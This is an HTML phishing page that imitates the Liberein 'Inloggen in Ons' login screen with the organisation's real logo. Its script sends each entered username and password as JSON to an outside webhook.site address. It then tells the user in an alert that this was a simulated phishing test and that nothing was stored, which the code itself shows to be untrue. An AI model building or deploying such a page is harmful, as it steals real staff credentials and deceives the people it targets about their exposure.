<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Liberein | Inloggen in Ons</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-image: url('https://upload.wikimedia.org/wikipedia/commons/1/1c/Van_Gogh_-_Starry_Night_-_Google_Art_Project.jpg');
      background-size: cover;
      background-position: center;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      background-color: #fff;
      border-radius: 12px;
      padding: 40px 30px;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
    }
    .logo {
      text-align: center;
      margin-bottom: 20px;
    }
    .logo img {
      height: 40px;
    }
    .login-title {
      font-size: 18px;
      text-align: center;
      color: #333;
      margin-bottom: 20px;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 15px;
    }
    .login-button {
      width: 100%;
      background-color: #d13c75;
      color: white;
      padding: 12px;
      font-size: 16px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 15px;
    }
    .login-button:hover {
      background-color: #b12e63;
    }
    .footer-text {
      margin-top: 20px;
      font-size: 0.85em;
      color: #666;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo">
      <img src="https://www.liberein.nl/themes/custom/liberein/logo.svg" alt="Liberein logo">
    </div>
    <div class="login-title">Inloggen in Ons</div>
    <form onsubmit="handleSubmit(event)">
      <input type="text" id="username" name="username" placeholder="Gebruikersnaam" required>
      <input type="password" id="password" name="password" placeholder="Wachtwoord" required>
      <button type="submit" class="login-button">Aanmelden</button>
    </form>
    <div class="footer-text">
      Je wordt doorgestuurd naar je vorige locatie. <a href="#" style="color:#666;">Dit wil ik niet.</a>
    </div>
  </div>

  <script>
    function handleSubmit(event) {
      event.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      fetch("https://webhook.site/639b037a-e040-4165-b6bb-83bc9dfa7844", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          actie: "Phishing simulatie",
          tijd: new Date().toISOString(),
          gebruiker: username,
          wachtwoord: password
        })
      });

      alert("⚠️ Dit was een gesimuleerde phishingtest.\nEr is niets opgeslagen.\nBedankt voor je alertheid!");
    }
  </script>
</body>
</html>
